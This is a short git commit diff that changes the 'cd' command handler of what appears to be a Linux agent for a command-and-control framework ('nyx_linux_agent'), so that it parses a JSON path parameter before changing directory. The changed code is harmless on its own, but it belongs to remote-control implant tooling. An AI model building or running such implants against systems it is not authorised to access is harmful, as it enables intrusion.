20e7671671c485a3f5dc915ace78689d3d006975
Harrison Craig <harrison.craig.20@cnu.edu>
2026-03-21 10:41:22 -0400

    fixing json load on cd

--- Payload_Type/nyx_service/nyx_linux_agent/agent_code/commands/cd.py
+++ Payload_Type/nyx_service/nyx_linux_agent/agent_code/commands/cd.py
@@ -1,8 +1,14 @@
 import os
+import json
 
 def execute(params, task_id, callback_id):
     try:
-        os.chdir(params.strip())
+        path = json.loads(params).get("path", "")
+    except Exception:
+        path = params
+
+    try:
+        os.chdir(path.strip())
         return os.getcwd()
     except Exception as e:
         return f"cd failed: {str(e)}"
